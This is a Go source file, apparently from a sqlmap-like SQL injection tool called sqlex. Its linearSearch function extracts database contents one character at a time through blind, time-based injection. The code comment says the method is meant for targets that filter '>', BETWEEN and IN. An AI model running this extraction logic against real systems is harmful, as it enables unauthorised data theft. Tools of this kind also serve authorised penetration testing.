package extract

import (
	"context"
	"fmt"
	"strings"

	"github.com/SobhanYasami/sqlex/internal/config"
	"github.com/SobhanYasami/sqlex/internal/inject"
	"github.com/SobhanYasami/sqlex/internal/payloads"
	"github.com/SobhanYasami/sqlex/internal/request"
)

// linearSearch tries each ASCII value sequentially using '=' — slowest but most
// compatible when '>', BETWEEN, and IN are all filtered.
func linearSearch(
	ctx context.Context,
	cfg *config.Config,
	rs *config.RunState,
	client *request.Client,
	ectx ExtractionCtx,
	dataPL, queryable string,
	pos, lo, hi int,
) (rune, error) {
	for candidate := lo; candidate <= hi; candidate++ {
		select {
		case <-ctx.Done():
			return 0, ctx.Err()
		default:
		}
		probe := payloads.RenderProbe(dataPL, queryable, pos, candidate)
		expr := strings.ReplaceAll(
			strings.ReplaceAll(ectx.Vector, "[INFERENCE]", probe),
			"[SLEEPTIME]", fmt.Sprintf("%d", int(cfg.TimeSec.Seconds())),
		)
		resp, err := inject.Expression(ctx, cfg, rs, client, injectCtx(ectx), expr, false)
		if err != nil {
			continue
		}
		if evalHit(ectx, rs, resp, cfg) {
			return rune(candidate), nil
		}
	}
	return ' ', nil
}
